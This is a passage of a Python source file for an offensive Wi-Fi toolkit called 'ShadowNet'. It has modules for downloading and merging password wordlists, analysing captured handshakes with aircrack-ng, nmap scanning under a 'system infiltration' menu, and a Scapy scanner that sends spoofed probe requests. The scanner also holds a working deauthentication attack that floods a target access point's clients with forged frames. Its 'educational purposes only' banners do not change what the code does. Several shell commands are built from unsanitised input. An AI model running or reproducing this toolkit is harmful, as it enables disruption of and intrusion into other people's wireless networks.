                print("[!] SOURCE FILE NOT FOUND")
                return
        
        if passwords:
            with open(output_file, 'w') as f:
                for password in set(passwords):
                    if password.strip():
                        f.write(password.strip() + '\n')
            
            print(f"[+] CREATED WORDLIST: {output_file}")
            print(f"[+] TOTAL PASSWORDS: {len(set(passwords))}")
    
    def merge_wordlists(self):
        print("\n[*] WORDLIST MERGER")
        print("=" * 20)
        
        wordlists = []
        print("[*] ENTER WORDLIST PATHS (EMPTY LINE TO FINISH)")
        
        while True:
            path = input("WORDLIST PATH: ")
            if not path:
                break
            if Path(path).exists():
                wordlists.append(path)
            else:
                print("[!] FILE NOT FOUND")
        
        if len(wordlists) < 2:
            print("[!] NEED AT LEAST 2 WORDLISTS")
            return
        
        output_file = input("[+] OUTPUT FILENAME: ") or "merged_wordlist.txt"
        
        all_passwords = set()
        
        for wordlist in wordlists:
            try:
                with open(wordlist, 'r') as f:
                    passwords = [line.strip() for line in f.readlines()]
                    all_passwords.update(passwords)
                print(f"[+] LOADED {len(passwords)} FROM {wordlist}")
            except Exception as e:
                print(f"[!] ERROR READING {wordlist}: {e}")
        
        with open(output_file, 'w') as f:
            for password in sorted(all_passwords):
                if password:
                    f.write(password + '\n')
        
        print(f"[+] MERGED WORDLIST CREATED: {output_file}")
        print(f"[+] TOTAL UNIQUE PASSWORDS: {len(all_passwords)}")
    
    def wordlist_stats(self):
        wordlist_path = input("[+] WORDLIST PATH: ")
        
        if not Path(wordlist_path).exists():
            print("[!] WORDLIST NOT FOUND")
            return
        
        try:
            with open(wordlist_path, 'r') as f:
                passwords = [line.strip() for line in f.readlines()]
            
            lengths = [len(p) for p in passwords if p]
            
            print(f"\n[*] WORDLIST STATISTICS: {wordlist_path}")
            print("=" * 40)
            print(f"TOTAL PASSWORDS: {len(passwords)}")
            print(f"UNIQUE PASSWORDS: {len(set(passwords))}")
            print(f"AVERAGE LENGTH: {sum(lengths)/len(lengths):.1f}")
            print(f"MIN LENGTH: {min(lengths)}")
            print(f"MAX LENGTH: {max(lengths)}")
            
            length_dist = {}
            for length in lengths:
                length_dist[length] = length_dist.get(length, 0) + 1
            
            print(f"\nLENGTH DISTRIBUTION:")
            for length in sorted(length_dist.keys())[:10]:
                print(f"  {length} chars: {length_dist[length]} passwords")
                
        except Exception as e:
            print(f"[!] ERROR ANALYZING WORDLIST: {e}")
    
    def download_wordlists(self):
        print("\n[*] WORDLIST DOWNLOADER")
        print("=" * 25)
        print("[1] ROCKYOU.TXT")
        print("[2] COMMON PASSWORDS")
        print("[3] WIFI PASSWORDS")
        print("[4] CUSTOM URL")
        
        choice = input("[+] SELECT OPTION: ")
        
        if choice == "1":
            url = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
            filename = "rockyou.txt"
        elif choice == "2":
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
            filename = "common_passwords.txt"
        elif choice == "3":
            url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"
            filename = "wifi_passwords.txt"
        elif choice == "4":
            url = input("[+] URL: ")
            filename = input("[+] FILENAME: ")
        else:
            return
        
        print(f"[*] DOWNLOADING {filename}...")
        try:
            import urllib.request
            urllib.request.urlretrieve(url, filename)
            print(f"[+] DOWNLOADED: {filename}")
        except Exception as e:
            print(f"[!] DOWNLOAD FAILED: {e}")
    
    def file_operations(self):
        print("\n[*] FILE OPERATIONS MODULE")
        print("=" * 50)
        print("[1] LIST CAPTURE FILES")
        print("[2] ANALYZE HANDSHAKE")
        print("[3] FILE CONVERTER")
        print("[4] CLEAN TEMP FILES")
        
        choice = input("[+] SELECT OPTION: ")
        
        if choice == "1":
            self.list_capture_files()
        elif choice == "2":
            self.analyze_handshake()
        elif choice == "3":
            self.file_converter()
        elif choice == "4":
            self.clean_temp_files()
        
        input("\n[PRESS ENTER TO CONTINUE]")
    
    def list_capture_files(self):
        print("\n[*] CAPTURE FILES")
        print("=" * 20)
        
        cap_files = list(Path(".").glob("*.cap")) + list(Path(".").glob("*.pcap"))
        
        if not cap_files:
            print("[!] NO CAPTURE FILES FOUND")
            return
        
        for i, file in enumerate(cap_files, 1):
            size = file.stat().st_size
            modified = datetime.fromtimestamp(file.stat().st_mtime)
            print(f"{i:2d}: {file.name} ({size} bytes, {modified.strftime('%Y-%m-%d %H:%M')})")
    
    def analyze_handshake(self):
        handshake_file = input("[+] HANDSHAKE FILE: ")
        
        if not Path(handshake_file).exists():
            print("[!] FILE NOT FOUND")
            return
        
        print(f"[*] ANALYZING {handshake_file}...")
        cmd = f"aircrack-ng {handshake_file}"
        subprocess.run(cmd, shell=True)
    
    def file_converter(self):
        print("\n[*] FILE CONVERTER")
        print("=" * 20)
        print("[1] CAP TO HCCAPX")
        print("[2] PCAP TO CAP")
        
        choice = input("[+] SELECT CONVERSION: ")
        
        if choice == "1":
            input_file = input("[+] INPUT CAP FILE: ")
            output_file = input("[+] OUTPUT HCCAPX FILE: ")
            
            if Path(input_file).exists():
                cmd = f"cap2hccapx {input_file} {output_file}"
                subprocess.run(cmd, shell=True)
            else:
                print("[!] INPUT FILE NOT FOUND")
        
        elif choice == "2":
            input_file = input("[+] INPUT PCAP FILE: ")
            output_file = input("[+] OUTPUT CAP FILE: ")
            
            if Path(input_file).exists():
                cmd = f"editcap {input_file} {output_file}"
                subprocess.run(cmd, shell=True)
            else:
                print("[!] INPUT FILE NOT FOUND")
    
    def clean_temp_files(self):
        print("\n[*] CLEANING TEMPORARY FILES...")
        
        temp_patterns = ["*.tmp", "*.temp", "*-01.cap", "*-01.csv", "*-01.kismet.csv"]
        cleaned = 0
        
        for pattern in temp_patterns:
            files = list(Path(".").glob(pattern))
            for file in files:
                file.unlink()
                cleaned += 1
                print(f"[+] DELETED: {file.name}")
        
        print(f"[+] CLEANED {cleaned} TEMPORARY FILES")
    
    def system_infiltration(self):
        print("\n[*] SYSTEM INFILTRATION MODULE")
        print("=" * 50)
        print("[1] PORT SCAN")
        print("[2] SERVICE ENUMERATION")
        print("[3] VULNERABILITY SCAN")
        print("[4] NETWORK MAPPING")
        
        choice = input("[+] SELECT OPTION: ")
        target = input("[+] TARGET IP: ")
        
        if choice == "1":
            cmd = f"nmap -sS -O {target}"
        elif choice == "2":
            cmd = f"nmap -sV -sC {target}"
        elif choice == "3":
            cmd = f"nmap --script vuln {target}"
        elif choice == "4":
            cmd = f"nmap -sn {target}/24"
        else:
            return
        
        print(f"[*] EXECUTING: {cmd}")
        subprocess.run(cmd, shell=True)
        
        input("\n[PRESS ENTER TO CONTINUE]")
    
    def run(self):
        shadownet_intro()
        
        if not self.check_dependencies():
            input("[PRESS ENTER TO EXIT]")
            return
        
        while True:
            self.display_banner()
            
            choice = input("\n[+] SELECT MODULE: ")
            
            if choice == "00" or choice == "0":
                self.system_setup()
            if choice == "01" or choice == "1":
                self.network_recon()
            elif choice == "02" or choice == "2":
                self.hidden_ssid_discovery()
            elif choice == "03" or choice == "3":
                self.access_point_analysis()
            elif choice == "04" or choice == "4":
                self.deauth_operations()
            elif choice == "05" or choice == "5":
                self.wireless_bruteforce()
            elif choice == "06" or choice == "6":
                self.handshake_capture()
            elif choice == "07" or choice == "7":
                self.dictionary_attack()
            elif choice == "08" or choice == "8":
                self.system_infiltration()
            elif choice == "09" or choice == "9":
                self.wordlist_management()
            elif choice == "10" or choice == "10":
                self.file_operations()
            elif choice == "11" or choice == "11":
                self.wireless_auto_audit()
            elif choice == "99":
                print("\n[*] SHADOWNET TERMINATED")
                print("[*] OUT")
                break
            else:
                print("\n[!] INVALID SELECTION")
                time.sleep(1)


class HiddenNetworkScanner:
    def __init__(self, interface=None, timeout=30, passive_scan=False, use_scapy=True):
        self.interface = interface
        self.timeout = timeout
        self.passive_scan = passive_scan
        self.use_scapy = use_scapy and SCAPY_AVAILABLE
        self.networks = defaultdict(dict)
        self.hidden_networks = []
        self.probe_requests = defaultdict(set)
        self.scanning = False
        self.clients = defaultdict(set)
        self.deauth_enabled = False

        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        """Handle interrupt signals gracefully"""
        print(f"\nReceived signal {signum}, stopping scan...")
        self.scanning = False
        
    def check_requirements(self):
        """Check if required tools are available"""
        required_tools = ['iwlist', 'iw', 'nmcli']
        missing_tools = []
        
        for tool in required_tools:
            try:
                subprocess.run(['which', tool], check=True, capture_output=True)
            except subprocess.CalledProcessError:
                missing_tools.append(tool)
        
        if missing_tools:
            print(f"Missing required tools: {', '.join(missing_tools)}")
            print("Please install wireless-tools and NetworkManager")
            return False
        return True
    
    def get_wireless_interfaces(self):
        """Get available wireless interfaces"""
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    interface = line.split()[-1]
                    interfaces.append(interface)
            return interfaces
        except Exception as e:
            print(f"Error getting wireless interfaces: {e}")
            return []
    
    def set_monitor_mode(self, interface):
        """Set interface to monitor mode"""
        try:
            print(f"Setting {interface} to monitor mode...")
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
            subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'monitor'], check=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
            print(f"Monitor mode enabled on {interface}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"Failed to set monitor mode: {e}")
            return False
    
    def restore_managed_mode(self, interface):
        """Restore interface to managed mode"""
        try:
            print(f"Restoring {interface} to managed mode...")
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
            subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'managed'], check=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
            print(f"Managed mode restored on {interface}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to restore managed mode: {e}")
    
    def parse_iwlist_output(self, output):
        """Parse iwlist scan output"""
        networks = []
        cells = output.split('Cell ')
        
        for cell in cells[1:]: 
            network = {}
            lines = cell.split('\n')
            
            for line in lines:
                line = line.strip()
                
                if 'Address:' in line:
                    network['bssid'] = line.split('Address: ')[1].strip()
                
                elif 'ESSID:' in line:
                    essid = line.split('ESSID:')[1].strip().strip('"')
                    network['ssid'] = essid if essid else '<hidden>'
                
                elif 'Channel:' in line:
                    network['channel'] = line.split('Channel:')[1].strip()

                elif 'Signal level=' in line:
                    signal_match = re.search(r'Signal level=(-?\d+)', line)
                    if signal_match:
                        network['signal'] = int(signal_match.group(1))

                elif 'Encryption key:' in line:
                    network['encryption'] = 'on' in line.lower()

                elif 'IEEE 802.11i/WPA2' in line:
                    network['security'] = 'WPA2'
                elif 'WPA Version 1' in line:
                    network['security'] = 'WPA'
                elif 'Privacy' in line:
                    network['security'] = 'WEP'
            
            if network.get('bssid'):
                networks.append(network)
        
        return networks
    
    def scan_with_iwlist(self, interface):
        """Scan networks using iwlist"""
        try:
            print(f"Scanning with iwlist on {interface}...")
            result = subprocess.run(['sudo', 'iwlist', interface, 'scan'], 
                                  capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                return self.parse_iwlist_output(result.stdout)
            else:
                print(f"iwlist scan failed: {result.stderr}")
                return []
        except subprocess.TimeoutExpired:
            print("iwlist scan timed out")
            return []
        except Exception as e:
            print(f"Error in iwlist scan: {e}")
            return []
    
    def scan_with_nmcli(self):
        """Scan networks using nmcli"""
        try:
            print("Scanning with nmcli...")
            result = subprocess.run(['nmcli', '-t', '-f', 'SSID,BSSID,CHAN,SIGNAL,SECURITY', 
                                   'dev', 'wifi', 'list'], capture_output=True, text=True)
            
            networks = []
            for line in result.stdout.split('\n'):
                if line.strip():
                    parts = line.split(':')
                    if len(parts) >= 5:
                        network = {
                            'ssid': parts[0] if parts[0] else '<hidden>',
                            'bssid': parts[1],
                            'channel': parts[2],
                            'signal': int(parts[3]) if parts[3] else 0,
                            'security': parts[4]
                        }
                        networks.append(network)
            
            return networks
        except Exception as e:
            print(f"Error in nmcli scan: {e}")
            return []
    
    def passive_monitor_scan(self, interface, duration=30):
        """Perform passive monitoring scan"""
        try:
            print(f"Starting passive monitoring on {interface} for {duration} seconds...")
            
            # Use tcpdump to capture beacon frames
            cmd = ['sudo', 'tcpdump', '-i', interface, '-c', '1000', 
                   'type mgt subtype beacon', '-e', '-s', '256']
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, text=True)
            
            networks = set()
            start_time = time.time()
            
            while time.time() - start_time < duration:
                try:
                    output = process.stdout.readline()
                    if output:
                        # Parse beacon frame for BSSID and SSID
                        bssid_match = re.search(r'([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})', output)
                        if bssid_match:
                            bssid = bssid_match.group(1)
                            # Try to extract SSID from beacon
                            ssid = '<hidden>'  # Default for hidden networks
                            networks.add((bssid, ssid))
                except:
                    break
            
            process.terminate()
            return [{'bssid': bssid, 'ssid': ssid} for bssid, ssid in networks]
            
        except Exception as e:
            print(f"Error in passive scan: {e}")
            return []
    
    def get_mac_vendor(self, mac):
        """Get MAC address vendor information"""
        try:
            oui = mac[:8].upper().replace(':', '')
            vendor_db = {
                '00:50:F2': 'Microsoft',
                '00:0C:43': 'Ralink',
                '00:1B:2F': 'Intel',
                '00:25:00': 'Apple',
                '00:13:CE': 'Cisco',
                '00:0F:B5': 'Netgear',
                '00:26:F2': 'Netgear',
                '00:14:BF': 'Netgear',
                '00:18:39': 'Cisco',
                '00:1F:90': 'Cisco'
            }
            
            for oui_prefix, vendor in vendor_db.items():
                if mac.upper().startswith(oui_prefix):
                    return vendor
            return 'Unknown'
        except:
            return 'Unknown'
    
    def process_beacon(self, pkt):
        """Process beacon frames to detect networks"""
        if not pkt.haslayer(Dot11Beacon):
            return
            
        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
        
        channel = int(ord(pkt[Dot11Elt:3].info))
        signal_strength = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else 0
        
        is_hidden = len(ssid) == 0 or ssid.isspace()
        
        network_info = {
            'bssid': bssid,
            'ssid': ssid if not is_hidden else '<hidden>',
            'channel': channel,
            'signal': signal_strength,
            'hidden': is_hidden,
            'vendor': self.get_mac_vendor(bssid),
            'timestamp': datetime.now().isoformat()
        }
        
        # Parse security information
        security_info = self.parse_security_info(pkt)
        network_info.update(security_info)
        
        self.networks[bssid] = network_info
        
        if is_hidden:
            self.hidden_networks.append(network_info)
            
        return network_info
    
    def process_probe_request(self, pkt):
        """Process probe request frames to discover hidden networks"""
        if not pkt.haslayer(Dot11ProbeReq):
            return
            
        client_mac = pkt[Dot11].addr2
        
        if pkt.haslayer(Dot11Elt):
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
            if ssid:
                self.probe_requests[client_mac].add(ssid)
                
                for bssid, network in self.networks.items():
                    if network.get('hidden', False):
                        self.correlate_probe_with_hidden(client_mac, ssid, bssid)
    
    def process_probe_response(self, pkt):
        """Process probe response frames"""
        if not pkt.haslayer(Dot11ProbeResp):
            return
            
        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')

        if bssid in self.networks:
            if self.networks[bssid].get('hidden', False) and ssid:
                self.networks[bssid]['ssid'] = ssid
                self.networks[bssid]['hidden'] = False
                print(f"Hidden network revealed: {bssid} -> {ssid}")
    
    def correlate_probe_with_hidden(self, client_mac, ssid, bssid):
        """Correlate probe requests with hidden networks"""
        self.clients[bssid].add(client_mac)

        if bssid in self.networks and self.networks[bssid].get('hidden', False):
            confidence = self.calculate_correlation_confidence(client_mac, ssid, bssid)
            if confidence > 0.7:
                self.networks[bssid]['probable_ssid'] = ssid
                self.networks[bssid]['confidence'] = confidence
                print(f"Probable SSID for {bssid}: {ssid} (confidence: {confidence:.2f})")
    
    def calculate_correlation_confidence(self, client_mac, ssid, bssid):
        """Calculate confidence level for SSID correlation"""
        confidence = 0.5 

        if len(self.clients[bssid]) > 1:
            confidence += 0.2

        probe_count = sum(1 for probes in self.probe_requests.values() if ssid in probes)
        if probe_count > 1:
            confidence += 0.1
            
        return min(confidence, 1.0)
    
    def parse_security_info(self, pkt):
        """Parse security information from beacon/probe response"""
        security_info = {'security': 'Open', 'encryption': False}
        
        if pkt.haslayer(Dot11Elt):
            elt = pkt[Dot11Elt]
            while elt:
                if elt.ID == 48: 
                    security_info['security'] = 'WPA2'
                    security_info['encryption'] = True
                elif elt.ID == 221: 
                    if elt.info.startswith(b'\x00\x50\xf2\x01'):
                        security_info['security'] = 'WPA'
                        security_info['encryption'] = True
                
                elt = elt.payload if hasattr(elt, 'payload') else None
        
        if pkt.haslayer(Dot11Beacon) and pkt[Dot11Beacon].cap & 0x10:
            security_info['security'] = 'WEP'
            security_info['encryption'] = True
            
        return security_info
    
    def packet_handler(self, pkt):
        """Main packet handler for Scapy sniffing"""
        if not self.scanning:
            return
            
        try:
            if pkt.haslayer(Dot11):
                if pkt.haslayer(Dot11Beacon):
                    self.process_beacon(pkt)
                elif pkt.haslayer(Dot11ProbeReq):
                    self.process_probe_request(pkt)
                elif pkt.haslayer(Dot11ProbeResp):
                    self.process_probe_response(pkt)
                    
        except Exception as e:
            if self.verbose:
                print(f"Error processing packet: {e}")
    
    def send_probe_requests(self, interface, target_ssids=None):
        """Send probe requests to discover hidden networks"""
        if not self.use_scapy:
            print("Scapy not available for probe requests")
            return
            
        common_ssids = [
            "linksys", "netgear", "dlink", "tplink", "asus", "buffalo",
            "cisco", "apple", "android", "iphone", "samsung", "lg",
            "home", "office", "guest", "wifi", "wireless", "network",
            "router", "modem", "internet", "broadband", "default"
        ]
        
        if target_ssids:
            ssids_to_probe = target_ssids
        else:
            ssids_to_probe = common_ssids
            
        print(f"Sending probe requests for {len(ssids_to_probe)} SSIDs...")
        
        for ssid in ssids_to_probe:
            try:
                probe_req = (
                    RadioTap() /
                    Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", 
                          addr2=RandMAC(), addr3="ff:ff:ff:ff:ff:ff") /
                    Dot11ProbeReq() /
                    Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                )
                
                sendp(probe_req, iface=interface, verbose=False)
                time.sleep(0.1) 
                
            except Exception as e:
                if self.verbose:
                    print(f"Error sending probe for {ssid}: {e}")
    
    def perform_deauth_attack(self, target_bssid, client_mac=None, count=10):
        """Perform deauthentication attack (for educational purposes)"""
        if not self.deauth_enabled:
            print("Deauth attacks are disabled. Enable with --enable-deauth")
            return
            
        if not self.use_scapy:
            print("Scapy not available for deauth attacks")
            return
            
        print(f"WARNING: Performing deauth attack on {target_bssid}")
        print("This is for educational purposes only!")

        if not client_mac:
            client_mac = "ff:ff:ff:ff:ff:ff"
            
        try:
            deauth = (
                RadioTap() /
                Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) /
                Dot11Deauth(reason=7)
            )

            for i in range(count):
                sendp(deauth, iface=self.interface, verbose=False)
                time.sleep(0.1)
                
            print(f"Sent {count} deauth packets")
            
        except Exception as e:
            print(f"Error performing deauth attack: {e}")
    
    def scapy_scan(self, interface, duration=30):
        """Perform Scapy-based wireless scanning"""
        if not self.use_scapy:
            print("Scapy not available for advanced scanning")
            return []
            
        print(f"Starting Scapy-based scan on {interface} for {duration} seconds...")
        
        self.scanning = True

        def capture_packets():
            try:
                sniff(iface=interface, prn=self.packet_handler, 
                      timeout=duration, store=0)
            except Exception as e:
                print(f"Error during packet capture: {e}")
        
        capture_thread = threading.Thread(target=capture_packets)
        capture_thread.daemon = True
        capture_thread.start()

        if self.passive_scan:
            probe_thread = threading.Thread(
                target=self.send_probe_requests, 
                args=(interface,)
            )
            probe_thread.daemon = True
            probe_thread.start()

        time.sleep(duration)
        self.scanning = False

        capture_thread.join(timeout=2)
        
        return list(self.networks.values())
    
    def scan_networks(self):
        """Main network scanning function with enhanced Scapy support"""
        if not self.check_requirements():
            return []
        
        all_networks = []
        
        if self.interface:
            interfaces = [self.interface]
        else:
            interfaces = self.get_wireless_interfaces()
            if not interfaces:
                print("No wireless interfaces found")
                return []
        
        for interface in interfaces:
            print(f"\nScanning on interface: {interface}")

            if self.use_scapy:
                try:
                    scapy_networks = self.scapy_scan(interface, self.timeout)
                    all_networks.extend(scapy_networks)
                    print(f"Scapy scan found {len(scapy_networks)} networks")
                except Exception as e:
                    print(f"Scapy scan failed: {e}")
                    print("Falling back to traditional methods...")

            networks = self.scan_with_iwlist(interface)
            all_networks.extend(networks)

            if self.passive_scan and not self.use_scapy:
                original_mode = True
                if self.set_monitor_mode(interface):
                    passive_networks = self.passive_monitor_scan(interface, self.timeout)
                    all_networks.extend(passive_networks)
                    self.restore_managed_mode(interface)

        nmcli_networks = self.scan_with_nmcli()
        all_networks.extend(nmcli_networks)

        unique_networks = {}
        for network in all_networks:
            bssid = network.get('bssid', '')
            if bssid and bssid not in unique_networks:
                unique_networks[bssid] = network

                ssid = network.get('ssid', '')
                if not ssid or ssid == '<hidden>' or ssid == '""' or len(ssid.strip()) == 0:
                    network['hidden'] = True
                    if network not in self.hidden_networks:
                        self.hidden_networks.append(network)
                else:
                    network['hidden'] = False
        
        return list(unique_networks.values())
    
    def display_results(self, networks):
        """Display scan results with enhanced information"""
        print(f"\n{'='*90}")
        print("ENHANCED HIDDEN NETWORKS SCAN RESULTS")
        print(f"{'='*90}")
        print(f"Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total networks found: {len(networks)}")
        print(f"Hidden networks: {len(self.hidden_networks)}")
        print(f"Probe requests captured: {len(self.probe_requests)}")
        print(f"Unique clients detected: {sum(len(clients) for clients in self.clients.values())}")
        
        if self.hidden_networks:
            print(f"\n{'='*90}")
            print("HIDDEN NETWORKS DETECTED:")
            print(f"{'='*90}")
            print(f"{'BSSID':<18} {'SSID':<20} {'Probable SSID':<15} {'Channel':<8} {'Signal':<8} {'Security':<10} {'Vendor':<15}")
            print("-" * 90)
            
            for network in self.hidden_networks:
                bssid = network.get('bssid', 'Unknown')
                ssid = network.get('ssid', '<hidden>')
                probable_ssid = network.get('probable_ssid', '-')
                channel = network.get('channel', 'Unknown')
                signal = network.get('signal', 0)
                security = network.get('security', 'Unknown')
                vendor = network.get('vendor', 'Unknown')
                
                print(f"{bssid:<18} {ssid:<20} {probable_ssid:<15} {channel:<8} {signal:<8} {security:<10} {vendor:<15}")

        if self.probe_requests:
            print(f"\n{'='*90}")
            print("PROBE REQUEST ANALYSIS:")
            print(f"{'='*90}")
            print(f"{'Client MAC':<18} {'Probed SSIDs':<50}")
            print("-" * 90)
            
            for client_mac, ssids in list(self.probe_requests.items())[:10]: 
                ssid_list = ', '.join(list(ssids)[:5]) 
                if len(ssids) > 5:
                    ssid_list += f" ... (+{len(ssids)-5} more)"
                print(f"{client_mac:<18} {ssid_list:<50}")
        
        print(f"\n{'='*90}")
        print("ALL NETWORKS:")
        print(f"{'='*90}")
        print(f"{'BSSID':<18} {'SSID':<25} {'Channel':<8} {'Signal':<8} {'Security':<10} {'Hidden':<8} {'Vendor':<15}")
        print("-" * 100)
        
        for network in sorted(networks, key=lambda x: x.get('signal', 0), reverse=True):
            bssid = network.get('bssid', 'Unknown')
            ssid = network.get('ssid', '<hidden>')
            channel = network.get('channel', 'Unknown')
            signal = network.get('signal', 0)
            security = network.get('security', 'Unknown')
            hidden = 'Yes' if network.get('hidden', False) else 'No'
            vendor = network.get('vendor', 'Unknown')
            
            print(f"{bssid:<18} {ssid:<25} {channel:<8} {signal:<8} {security:<10} {hidden:<8} {vendor:<15}")
        
        if self.use_scapy:
            self.display_insights(networks)
    
    def display_insights(self, networks):
        """Display additional insights from Scapy analysis"""
        print(f"\n{'='*90}")
        print("ADVANCED INSIGHTS:")
        print(f"{'='*90}")
        
        channels = {}
        for network in networks:
            channel = network.get('channel', 'Unknown')
            channels[channel] = channels.get(channel, 0) + 1
        
        print("Channel Distribution:")
        for channel, count in sorted(channels.items()):
            print(f"  Channel {channel}: {count} networks")

        security_types = {}
        for network in networks:
            security = network.get('security', 'Unknown')
            security_types[security] = security_types.get(security, 0) + 1
        
        print(f"\nSecurity Analysis:")
        for security, count in sorted(security_types.items()):
            print(f"  {security}: {count} networks")

        hidden_with_probable = sum(1 for net in self.hidden_networks if net.get('probable_ssid'))
        if hidden_with_probable > 0:
            print(f"\nHidden Network Insights:")
            print(f"  Networks with probable SSID: {hidden_with_probable}")
            print(f"  Success rate: {(hidden_with_probable/len(self.hidden_networks))*100:.1f}%")

        vendors = {}
        for network in networks:
            vendor = network.get('vendor', 'Unknown')
            vendors[vendor] = vendors.get(vendor, 0) + 1
        
        print(f"\nVendor Distribution:")
        for vendor, count in sorted(vendors.items(), key=lambda x: x[1], reverse=True)[:5]:
            print(f"  {vendor}: {count} networks")
    
    def export_results(self, networks, filename=None):
        """Export results to JSON file"""
        if not filename:
            filename = f"network_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        export_data = {
            'scan_time': datetime.now().isoformat(),
            'total_networks': len(networks),
            'hidden_networks_count': len(self.hidden_networks),
            'networks': networks,
            'hidden_networks': self.hidden_networks
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(export_data, f, indent=2)
            print(f"\nResults exported to: {filename}")
        except Exception as e:
            print(f"Error exporting results: {e}")


def main():
    parser = argparse.ArgumentParser(
        description='Enhanced Hidden Networks Scanner - Advanced SSID discovery with Scapy'
    )
    parser.add_argument('-i', '--interface', help='Wireless interface to use')
    parser.add_argument('-t', '--timeout', type=int, default=30, 
                       help='Scan timeout in seconds (default: 30)')
    parser.add_argument('-p', '--passive', action='store_true',
                       help='Enable passive monitoring with probe requests')
    parser.add_argument('-o', '--output', help='Output file for results (JSON format)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    parser.add_argument('--no-scapy', action='store_true',
                       help='Disable Scapy-based scanning')
    parser.add_argument('--enable-deauth', action='store_true',
                       help='Enable deauth attacks (EDUCATIONAL PURPOSE ONLY)')
    parser.add_argument('--probe-ssids', nargs='*',
                       help='Specific SSIDs to probe for')
    parser.add_argument('--deauth-target', 
                       help='Target BSSID for deauth attack (requires --enable-deauth)')
    parser.add_argument('--deauth-count', type=int, default=10,
                       help='Number of deauth packets to send (default: 10)')
    
    args = parser.parse_args()
    
    if not is_root():
        print("This tool requires elevated privileges. On Linux/macOS use sudo; on Windows run as Administrator.")
        sys.exit(1)

    if args.enable_deauth:
        print("WARNING: Deauth attacks enabled!")
        print("This feature is for EDUCATIONAL PURPOSES ONLY.")
        print("Use responsibly and only on networks you own or have permission to test.")
        response = input("Do you understand and agree? (yes/no): ")
        if response.lower() != 'yes':
            print("Exiting...")
            sys.exit(1)
    
    print("Enhanced Hidden Networks Scanner with Scapy")
    print("=" * 60)
    
    scanner = HiddenNetworkScanner(
        interface=args.interface,
        timeout=args.timeout,
        passive_scan=args.passive,
        use_scapy=not args.no_scapy
    )
    
    scanner.verbose = args.verbose
    scanner.deauth_enabled = args.enable_deauth
    
    try:
        networks = scanner.scan_networks()
        scanner.display_results(networks)

        if args.enable_deauth and args.deauth_target:
            print(f"\nPerforming deauth attack on {args.deauth_target}...")
            scanner.perform_deauth_attack(args.deauth_target, count=args.deauth_count)

        if args.output:
            scanner.export_results(networks, args.output)
            
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
        scanner.scanning = False
    except Exception as e:
        print(f"Error during scan: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()



def run_shadownet():
    shadownet = ShadowNet()
    shadownet.run()


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--legacy":
        main()
    else:
        if not is_root():
            print("SHADOWNET REQUIRES ELEVATED PRIVILEGES")
            print("RUN WITH: sudo python3 scan.py (Linux/macOS) or as Administrator (Windows)")
            sys.exit(1)
        run_shadownet()

